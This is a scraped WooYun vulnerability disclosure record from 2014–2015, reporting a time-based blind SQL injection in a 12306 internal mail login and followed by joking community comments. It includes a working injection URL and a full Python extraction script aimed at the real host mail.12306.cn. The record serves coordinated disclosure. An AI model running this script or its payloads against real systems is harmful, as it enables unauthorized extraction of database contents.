{"id": 46813, "wybug_id": "wooyun-2014-089304", "wybug_title": "12306某内部系统MySQL盲注需进一步修复(附验证脚本第四次绕过)", "wybug_corp": "12306", "wybug_author": "lijiejie", "wybug_date": "2014-12-30 13:55", "wybug_open_date": "2015-02-13 13:56", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向公众公开  简要描述： 12306某内部系统MySQL盲注需进一步修复(附验证脚本,第四次绕过)已存在多年，一直未修复完全，影响内部运营数据 详细说明：  注射点：\nPOST http://mail.12306.cn/app/mail/logindomain=aa'XOR(if(length(database())=4,sleep(1),0))OR'bb&id=1&lang=zh_cn&pwd=1&remember=on&sid=d947be26445ad5a2c49b16f97a22be55&style=classic\n参数domain可注入，MySQL time blind. sid每次需要重新获取。   漏洞证明：  猜解user()，得到：\nmail@localhost\n\n\n当前库：\nmail\n验证脚本： \n#encoding=gbkimport urllib2import reimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Content-Type': 'application/x-www-form-urlencoded',    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')html_doc = urllib2.urlopen('http://mail.12306.cn/app/mail/entry').read()sid = re.search('name=sid value=\"([^\"]+)\"', html_doc).group(1)print 'start to retrive MySQL user:'user = ''for i in range(1,15):    count = 0    for payload in payloads:        try:            conn = httplib.HTTPConnection('mail.12306.cn', timeout=60)            s = \"123'XOR(if(ascii(mid(lower(user())from(%s)for(1)))=%s,sleep(5),0))OR'bbb\" % (i, ord(payload) )            params = {                'id': '1',                'lang': 'zh_cn',                'pwd': 'test',                'remember': 'on',                'sid': sid,                'style': 'classic',                'domain': s            }            conn.request(method='POST',                         url='/app/mail/login',                         body = urllib.urlencode(params),                         headers = headers)            start_time = time.time()            html_doc = conn.getresponse().read()            conn.close()            if time.time() - start_time > 5:                raise Exception('oooooooops')            count += 1            sys.stdout.write('\\r'+ '.' * count)            sys.stdout.flush()        except:            user += payload            print '\\r[In progress]', user            breakprint '\\n[Done]MySQL user is', user\n   修复方案：  建议还是过滤一下   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-01-01 10:13 厂商回复： 正在检查 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-30 11:20 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这哪里只是影响用户信息，企业内部信息可能也在劫难逃啊    \n     2014-12-30 11:22 |    \t\tkydhzy \t\t\t( 普通白帽子  |\t\t\t        Rank:362 漏洞数:62        | 软件测试)\t\t \n  前排    \n     2014-12-30 11:25 |    \t\tg0odnight \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:19        | 么么哒，呵呵哒，么蛤蛤~)\t\t \n  CCTV看这里！    \n     2014-12-30 11:25 |    \t\tbitcoin \t\t\t( 普通白帽子  |\t\t\t        Rank:715 漏洞数:218        | 学习是最好的投资！)\t\t \n  @lijiejie 围观大牛！    \n     2014-12-30 11:27 |    \t\t杀器王子  \t\t\t( 普通白帽子  |\t\t\t        Rank:1532 漏洞数:121        | 磨刀霍霍向猪羊)\t\t \n  注入狂魔李姐姐     \n     2014-12-30 11:28 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  我在等李姐姐把杀妻王子干掉    \n     2014-12-30 11:30 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  12306是要火的节奏么。    \n     2014-12-30 11:37 |    \t\t冰冻冷咖啡 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 菜鸟一只)\t\t \n  你们这是一起刷12丧零六啊    \n     2014-12-30 11:40 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  第四次。。。所以说12306在某全球最大的平台去发奖励根本不解决问题么    \n     2014-12-30 11:46 |    \t\tlijiejie  \t\t\t( 核心白帽子 |\t\t\t        Rank:2210 漏洞数:294        | Just for fun.)\t\t \n  @px1624  这个第四次的标题应该是审核的同学加的…  不过漏洞确实存在已久    \n     2014-12-30 11:48 |    \t\th4ckhell00 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 最温暖的两个字是什么？1、我在。2、别怕。...)\t\t \n  12306 这是年底要爆发的节奏吧。。    \n     2014-12-30 11:50 |    \t\tlijiejie  \t\t\t( 核心白帽子 |\t\t\t        Rank:2210 漏洞数:294        | Just for fun.)\t\t \n  @杀器王子  杀器王子全能王…  德艺双馨玩转各种内网渗透技术…    \n     2014-12-30 11:50 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  同一个位置第四次绕过。。    \n     2014-12-30 11:53 |    \t\t无心、 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:20        | 你不是风儿，我也不是沙，再怎么缠绵也到不...)\t\t \n  第四次，你们这是看不起这个几亿的网站么？    \n     2014-12-30 13:19 |    \t\t窝窝哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:29        | 没WB啊啊啊啊！)\t\t \n  继续打脸！12306竟然去360那边！    \n     2014-12-30 13:32 |    \t\tQiudays \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:9        | 感觉自己萌萌哒)\t\t \n  12306的开发不甘寂寞啊....    \n     2014-12-30 13:50 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  CCTV拍这里！    \n     2014-12-30 14:29 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  CCTV拍拍拍拍拍拍拍拍拍拍拍拍拍拍拍拍拍    \n     2014-12-30 15:01 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  吊炸天    \n     2014-12-30 15:22 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  有意思，谁还说是撞库    \n     2014-12-30 15:46 |    \t\tConTrol \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:43        | 【HD】以团队之名 以个人之荣耀 共建网...)\t\t \n  打脸啪啪啪    \n     2014-12-30 15:57 |    \t\t承诺 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 你关注的漏洞 发表了白帽子)\t\t \n  CCTV拍这里！.....papapa    \n     2014-12-30 16:21 |    \t\t打酱油的小男孩 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 俺也来乌云看看)\t\t \n  啪啪啪啪啪啪啪。啪啪啪啪啪啪啪。啪啪啪啪啪啪啪。啪啪啪啪啪啪啪。啪啪啪啪啪啪啪。    \n     2014-12-30 16:25 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  你好，请开下门，我们查下水表    \n     2014-12-30 16:44 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  打脸女娲么？    \n     2014-12-30 16:44 |    \t\t忽然之间 \t\t\t( 普通白帽子  |\t\t\t        Rank:802 漏洞数:131        | 空白格)\t\t \n  你好，回家的票能给我整一张不？    \n     2014-12-30 17:29 |    \t\tbingfeng \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 万丈红尘三杯酒，千秋大业一壶茶。)\t\t \n  看不了的飘过~    \n     2014-12-30 19:39 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:48        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  我只想换一张回家的车票啊    \n     2014-12-30 21:35 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:63        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  @小威 威锅女娲是啥……话说我只想求一张回家的票。你们老撸铁道部干嘛    \n     2014-12-30 21:37 |    \t\tAngelic47 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        )\t\t \n  妈妈我要上电视啦~CCTV拍这里~~    \n     2014-12-30 21:48 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  有意思，谁还说是撞库、打脸的节奏， CCTV看这里，哎呦喂镜头往这里凑凑，对就是这样，哎哎哎哎 哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎哎摄像师你别动镜头呀    \n     2014-12-31 09:23 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  @红客十年 女娲能补天啊！真为你智商捉急    \n     2014-12-31 11:23 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:63        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  @小威 我知道女娲能补天，我想知到女娲跟铁道部有啥关系。。。还是是哪位大神    \n     2014-12-31 17:42 |    \t\t帅气小狼狗 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 汪汪汪)\t\t \n  使劲的打，让你不给我火车票。    \n     2015-01-01 11:32 |    \t\thuoji \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 目标是当个农民)\t\t \n  打脸赞！    \n     2015-01-01 12:40 |    \t\tObserver \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:8        | 我在夕阳下奔跑，那是我逝去的青春)\t\t \n  可以买一条两千块的项链了    \n     2015-01-01 13:54 |    \t\t斯杰 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | By：S丶jer)\t\t \n  我要上电视，ccav拍这里    \n     2015-01-01 15:15 |    \t\tSuperRookie \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:7        | 求收编，本人会注入，会上传，会Xss，会破...)\t\t \n  我代表12306在说一次 这是撞库啊 。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。    \n     2015-01-01 17:49 |    \t\txbuther \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 多多交流，一起进步。。。O(∩_∩)O~)\t\t \n  这里。。这里。。。    \n     2015-01-02 11:23 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  CCTV 看这里！啪啪啪啪啪啪啪    \n     2015-01-21 16:47 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  那么给力！    \n     2015-02-13 16:36 |    \t\tpw0 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        | 爱推理，爱计算机，爱社工，爱挖有（wei）...)\t\t \n  妈妈我要上电视啦！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}